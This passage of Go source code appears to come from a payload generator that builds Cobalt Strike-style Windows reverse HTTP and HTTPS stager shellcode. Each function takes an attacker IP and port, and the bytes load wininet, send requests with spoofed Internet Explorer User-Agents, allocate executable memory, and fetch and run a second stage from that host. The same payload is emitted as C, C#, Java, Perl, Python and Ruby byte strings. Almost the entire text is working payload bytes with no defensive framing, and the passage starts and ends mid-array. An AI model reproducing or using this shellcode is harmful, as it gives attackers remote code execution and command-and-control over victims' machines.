0xd3, 0x09, 0x87, 0xb5, 0x87, 0xd4, 0xc5, 0x24, 0x7c, 0x95, 0xcf, 0xd6, 0x3c, 0x55, 0xc0, 0x05, 0xd3, 0xaa, 0x07, 0x6f, 0x2f, 0xca, 0xf3, 0xd1, 0x76, 0x11, 0xd3, 0x53, 0xf7, 0x44, 0xb6, 0x9c, 0x0c, 0xa1, 0x34, 0x31, 0xf2, 0x8c, 0x42, 0xc8, 0xc9, 0xbc, 0xe1, 0xba, 0x84, 0x45, 0xe5, 0xcd, 0x89, 0x06, 0xe9, 0xfe, 0x60, 0xd3, 0x69, 0x3c, 0x20, 0x0f, 0xb7, 0xcc, 0xc6, 0xda, 0xd7, 0xc0, 0x6a, 0x7d, 0x15, 0x9b, 0x04, 0xa8, 0xc8, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4d, 0x41, 0x4c, 0x43, 0x29, 0x0d, 0x0a, 0x00, 0x43, 0xf4, 0xb0, 0xab, 0xbd, 0x2c, 0xdf, 0xe4, 0x02, 0x00, 0x0b, 0xa6, 0x74, 0xd4, 0x59, 0x4c, 0x70, 0xf1, 0xf0, 0x27, 0x2b, 0x2e, 0xb0, 0x32, 0x6c, 0x15, 0x40, 0x93, 0x8d, 0x9b, 0x12, 0x48, 0xc2, 0x2d, 0x95, 0x59, 0xf4, 0x7c, 0xab, 0x9b, 0xd4, 0x63, 0x25, 0xf2, 0x67, 0x09, 0x3f, 0xdb, 0x78, 0x05, 0xbc, 0xa1, 0xb6, 0x42, 0x44, 0xc3, 0x6b, 0xc8, 0x0a, 0x51, 0x70, 0xc7, 0x92, 0xa2, 0xb4, 0x65, 0xe8, 0xac, 0xa7, 0xae, 0xe6, 0x84, 0x27, 0xf5, 0x99, 0x3f, 0x7d, 0xd7, 0x61, 0x2a, 0x3d, 0x1d, 0xe6, 0x33, 0x2c, 0xac, 0x94, 0x1a, 0x40, 0xba, 0x18, 0x65, 0xde, 0xf0, 0x2b, 0xfa, 0x01, 0x46, 0x5d, 0x78, 0x38, 0x7a, 0xd8, 0xc4, 0x2a, 0xa0, 0x61, 0x9a, 0x97, 0x26, 0x60, 0x84, 0xed, 0x25, 0x99, 0x43, 0x47, 0xeb, 0x42, 0x24, 0x4e, 0x42, 0x1c, 0x3d, 0xdd, 0x99, 0x6c, 0x6c, 0x2a, 0xac, 0x61, 0x45, 0x7a, 0xaa, 0xc3, 0xcc, 0xe7, 0x96, 0x99, 0xe4, 0x3c, 0xa5, 0x30, 0xa3, 0xe1, 0x40, 0x13, 0xeb, 0x71, 0xf3, 0x8c, 0x99, 0x18, 0x6f, 0x17, 0xeb, 0x32, 0x1a, 0x58, 0x7f, 0xfd, 0x9f, 0x1b, 0xdb, 0x1d, 0xee, 0x67, 0x68, 0x47, 0x09, 0x31, 0x1a, 0xf5, 0x1d, 0x61, 0x7f, 0xc3, 0xe2, 0xd7, 0x3c, 0x75, 0xdc, 0xf7, 0x2b, 0x27, 0x34, 0xe1, 0xbb, 0x72, 0x1d, 0x7d, 0x2c, 0xf1, 0x9d, 0x9f, 0xdc, 0xfc, 0x79, 0xa9, 0x15, 0xaf, 0x45, 0x28, 0x30, 0xe0, 0x23, 0xec, 0x0d, 0x88, 0xe3, 0xcb, 0xa7, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Java = Java + fmt.Sprintf("0x%02x,", v)
	}
	Perl := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x71, 0x5a, 0x50, 0x42, 0x00, 0x77, 0xa2, 0x05, 0xe6, 0x0c, 0x5c, 0x4b, 0xeb, 0x77, 0x21, 0x5c, 0x27, 0xde, 0x2d, 0x0e, 0xbf, 0x6f, 0x3a, 0xfd, 0xab, 0xa0, 0xd4, 0x9a, 0x8d, 0xd4, 0xb0, 0xa0, 0x05, 0x3b, 0x1e, 0x6d, 0xcf, 0xac, 0x9c, 0x61, 0x88, 0xd9, 0xd5, 0x60, 0x1c, 0x6c, 0xa0, 0xa5, 0x37, 0x1a, 0x83, 0xa8, 0x54, 0x91, 0xbc, 0x6c, 0xd2, 0x08, 0xe8, 0xfa, 0x12, 0x65, 0x43, 0x1f, 0xa2, 0xef, 0x98, 0xc5, 0x79, 0xbc, 0x01, 0xa1, 0x8e, 0x37, 0xbc, 0x17, 0x40, 0xa5, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0xa1, 0xda, 0x01, 0xaf, 0x6b, 0x84, 0x15, 0x0c, 0xcd, 0xe4, 0x40, 0x7a, 0x12, 0x54, 0xa2, 0xb7, 0x81, 0x50, 0xcc, 0xf5, 0x2e, 0xf2, 0x02, 0xbb, 0x96, 0x46, 0x51, 0xad, 0xdc, 0xf7, 0x8b, 0x57, 0xd2, 0x93, 0xd1, 0xe2, 0x0c, 0x61, 0x87, 0x65, 0xf3, 0x7d, 0xa8, 0x29, 0xaf, 0x34, 0x8b, 0xe3, 0xd1, 0x74, 0x00, 0x83, 0xc9, 0x09, 0xba, 0x78, 0x23, 0x6a, 0xfd, 0x97, 0x04, 0xae, 0x31, 0x01, 0xa8, 0x69, 0xba, 0x95, 0xad, 0x7b, 0x71, 0x26, 0xbb, 0x03, 0x39, 0x56, 0xdb, 0x45, 0x31, 0x1e, 0x24, 0xeb, 0xac, 0x50, 0xea, 0x4b, 0xa9, 0xc4, 0xef, 0xde, 0xcf, 0xa1, 0xbd, 0x4b, 0xc3, 0xb0, 0xb7, 0xa3, 0xfd, 0xb2, 0x73, 0x8a, 0xa3, 0x02, 0x51, 0x3b, 0xe5, 0x2a, 0x0b, 0x9a, 0x1d, 0xc0, 0x0e, 0xd3, 0x60, 0x03, 0xdc, 0x69, 0x63, 0x69, 0xca, 0xb9, 0x78, 0xab, 0xe2, 0x3e, 0xc2, 0x20, 0x3f, 0x97, 0xac, 0x17, 0x94, 0x70, 0xa4, 0x3e, 0x14, 0xa8, 0xa0, 0x57, 0x5c, 0x6a, 0xe4, 0x25, 0x1b, 0x22, 0xd6, 0x57, 0x40, 0xf5, 0xd5, 0x01, 0x88, 0x5f, 0xf1, 0x67, 0x8a, 0x2e, 0xbe, 0x8b, 0xf2, 0x3b, 0xa8, 0xbf, 0xc8, 0x71, 0x3e, 0xe8, 0xed, 0xcd, 0xd3, 0x69, 0xdd, 0xe7, 0x5b, 0x86, 0x80, 0x8c, 0xcb, 0x39, 0x3e, 0x16, 0xb4, 0xd0, 0xc8, 0xf5, 0x88, 0x53, 0x15, 0x1f, 0x9c, 0xec, 0x9f, 0xa4, 0x53, 0xa5, 0xc3, 0x1d, 0xce, 0x35, 0x95, 0xb3, 0x8b, 0x35, 0x7e, 0x0b, 0xfb, 0x56, 0x3c, 0x7f, 0x0f, 0x45, 0xeb, 0x63, 0xab, 0x76, 0x3f, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Perl = Perl + fmt.Sprintf("0x%02x,", v)
	}
	Python := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x32, 0x78, 0x45, 0x6e, 0x00, 0x36, 0x1d, 0xa5, 0xd8, 0x3f, 0xac, 0xfd, 0x0c, 0x8f, 0xdc, 0xca, 0x0a, 0x10, 0x4a, 0xb5, 0xf3, 0x68, 0xad, 0x08, 0x81, 0x6d, 0xb0, 0x7c, 0x13, 0x52, 0x1d, 0x46, 0xe6, 0xa7, 0x36, 0x0b, 0x2c, 0x5b, 0x42, 0xee, 0x97, 0x03, 0xb5, 0xdd, 0x10, 0xa1, 0x87, 0x13, 0x3a, 0x67, 0x80, 0x7d, 0x2b, 0xa3, 0xa3, 0xf9, 0xf3, 0xc8, 0x3f, 0x26, 0xe4, 0x37, 0x0a, 0x09, 0x33, 0x53, 0xca, 0xd0, 0x79, 0x6f, 0x64, 0xa2, 0x14, 0xbf, 0x77, 0x99, 0x44, 0xaf, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x3b, 0x20, 0x44, 0x69, 0x67, 0x45, 0x78, 0x74, 0x3b, 0x20, 0x44, 0x54, 0x53, 0x20, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x0d, 0x0a, 0x00, 0x6c, 0x99, 0xe7, 0x4d, 0x75, 0x02, 0x0e, 0x8b, 0x86, 0x0e, 0x33, 0xbc, 0xb1, 0xca, 0x23, 0x9b, 0x39, 0x0e, 0x66, 0xe4, 0x51, 0xa2, 0xec, 0x6d, 0x65, 0x03, 0x39, 0x6c, 0x67, 0xe7, 0x31, 0xd4, 0xe5, 0x2c, 0xb4, 0x0e, 0xb1, 0x9f, 0x01, 0x0d, 0xa1, 0xc0, 0x6c, 0xa4, 0x3d, 0xf4, 0xef, 0x2f, 0x28, 0x30, 0xd5, 0x71, 0xcc, 0xda, 0x3c, 0x3b, 0xe4, 0x53, 0x82, 0x46, 0xf8, 0xa1, 0xc0, 0xc2, 0x9d, 0x00, 0xec, 0x0f, 0xc8, 0x8d, 0x49, 0x53, 0x7e, 0xb1, 0xba, 0xbe, 0xc2, 0x30, 0x46, 0x6f, 0xa8, 0x1a, 0x11, 0x6c, 0x55, 0x7c, 0x53, 0x90, 0x36, 0x65, 0x83, 0xf2, 0xc7, 0x9c, 0x4a, 0x90, 0x0b, 0x30, 0x32, 0x4e, 0xa9, 0xa8, 0x4a, 0x9f, 0x26, 0x11, 0xd9, 0xca, 0x45, 0x6e, 0xa8, 0x8f, 0xa3, 0x7e, 0x6a, 0x81, 0x33, 0x6b, 0xbd, 0x15, 0x93, 0x5f, 0xc1, 0xb0, 0xe4, 0x82, 0x5b, 0x64, 0xb7, 0x4c, 0xa0, 0x7e, 0x8f, 0xe3, 0xed, 0xb8, 0x39, 0x68, 0xde, 0x99, 0x97, 0xf7, 0xf6, 0x1b, 0xec, 0x73, 0x16, 0x19, 0x60, 0xdd, 0x8a, 0x0d, 0x37, 0xde, 0xb8, 0x2e, 0x73, 0x48, 0xf6, 0xc7, 0xa7, 0xfd, 0x77, 0x51, 0x43, 0x51, 0xed, 0x31, 0xf9, 0xcd, 0x71, 0xd8, 0x94, 0xde, 0xdc, 0x32, 0x28, 0x15, 0xcd, 0x3b, 0xbf, 0xee, 0x0a, 0xe9, 0x67, 0x81, 0xca, 0x9a, 0x4b, 0x15, 0x47, 0xd9, 0xd6, 0x77, 0xb8, 0x43, 0xc3, 0x8b, 0x1c, 0x8a, 0xf6, 0x19, 0xf6, 0x32, 0xc1, 0x1e, 0x4c, 0xfc, 0x69, 0x06, 0xf3, 0x94, 0x3a, 0x2f, 0x20, 0x5e, 0x4c, 0x9e, 0xc6, 0xa0, 0xb3, 0x75, 0x6d, 0xd6, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Python = Python + fmt.Sprintf("0x%02x,", v)
	}
	Ruby := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x33, 0x78, 0x49, 0x69, 0x00, 0xbb, 0x7a, 0x55, 0xc1, 0x23, 0xcf, 0xd2, 0x73, 0x3f, 0xd0, 0x76, 0xce, 0x72, 0xa4, 0x1f, 0x1d, 0xdc, 0x32, 0x52, 0xda, 0xde, 0x31, 0x01, 0xf4, 0xd1, 0x79, 0xbb, 0x05, 0x81, 0x9d, 0xc9, 0x8a, 0x78, 0x96, 0x5a, 0xe5, 0x7f, 0x88, 0xc7, 0xa3, 0x30, 0x8a, 0xde, 0x45, 0xb1, 0xf3, 0xad, 0x74, 0xe3, 0xee, 0x0e, 0x08, 0x54, 0xd6, 0xa7, 0xc4, 0x51, 0x3f, 0xb8, 0x63, 0xd5, 0x13, 0xa1, 0x4c, 0x5c, 0xd9, 0x8f, 0x12, 0x3f, 0x1a, 0xa6, 0xc4, 0x26, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4e, 0x50, 0x30, 0x36, 0x29, 0x0d, 0x0a, 0x00, 0xe6, 0xeb, 0x59, 0xaf, 0xa5, 0x3d, 0x37, 0xc6, 0x8e, 0x77, 0x75, 0x1f, 0xd5, 0xef, 0x44, 0x40, 0x6b, 0xfd, 0xd2, 0xcb, 0xca, 0x33, 0xc1, 0x10, 0xc8, 0xe2, 0x76, 0x9c, 0xc4, 0x9d, 0xcd, 0xcc, 0x6d, 0x95, 0xe6, 0x1e, 0xf2, 0x33, 0xe4, 0x84, 0x32, 0xde, 0x5b, 0x83, 0x80, 0xcf, 0x3e, 0x0f, 0x5d, 0x98, 0x9d, 0x09, 0xa4, 0x15, 0xe4, 0x1a, 0xe6, 0x96, 0xe6, 0x8a, 0x90, 0xc5, 0xd3, 0xd0, 0x38, 0xac, 0x70, 0x72, 0x38, 0xc4, 0x3f, 0xc0, 0xd4, 0x70, 0x54, 0x4a, 0x34, 0xd1, 0x4c, 0x64, 0xfe, 0x7e, 0x4d, 0x07, 0x30, 0x60, 0x43, 0xc3, 0x85, 0xdd, 0x41, 0xb6, 0xa8, 0xa4, 0xd8, 0x27, 0x8d, 0xa3, 0xb8, 0xb4, 0xc9, 0xe3, 0xd3, 0x38, 0x0e, 0x7c, 0xbf, 0x9d, 0xae, 0x0a, 0xc2, 0x30, 0xdf, 0x3f, 0xd1, 0x00, 0xbc, 0x8c, 0x8e, 0xd6, 0x80, 0xb2, 0x9f, 0xdb, 0x49, 0x68, 0xaf, 0x37, 0x48, 0xb9, 0x15, 0x5a, 0x0d, 0x54, 0x7b, 0x48, 0x48, 0xb5, 0xa3, 0x81, 0x32, 0x66, 0x2f, 0x36, 0x6c, 0x69, 0xce, 0xf6, 0xb8, 0x5a, 0x55, 0x16, 0x6e, 0xda, 0xe8, 0xe0, 0xcc, 0xab, 0xaf, 0x8f, 0xca, 0x38, 0xf7, 0x7f, 0xe0, 0xe4, 0x4d, 0x6b, 0x86, 0x5f, 0xf7, 0x14, 0xdc, 0xe3, 0xc1, 0x6c, 0xd3, 0xf3, 0x1f, 0x49, 0xf2, 0x9a, 0x86, 0x9e, 0xf6, 0xce, 0x04, 0xa0, 0xfd, 0x47, 0x9a, 0x6f, 0x25, 0x0e, 0x48, 0xdf, 0x22, 0xcd, 0x89, 0x83, 0x9b, 0xf1, 0x10, 0x09, 0x59, 0x82, 0x6f, 0x2b, 0xb0, 0xa9, 0xca, 0x98, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Ruby = Ruby + fmt.Sprintf("0x%02x,", v)
	}
	return CS_Shellcode{
		C,
		Cs,
		Java,
		Perl,
		Python,
		Ruby,
	}
}

func CS_Https_Shellcode32(ip string, port string) CS_Shellcode {
	port_int, _ := strconv.Atoi(port)
	port_byte := Port_byte_rec_IntToBytes(port_int)
	ip_byte := []byte(ip)
	fmt.Printf("%#v\n\n\n\n", ip_byte)
	head := []byte{0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0xa4, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68}
	C := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x77, 0x6f, 0x43, 0x33, 0x00, 0xd2, 0x8d, 0xf2, 0xf2, 0xe5, 0xd4, 0xbf, 0xc8, 0x14, 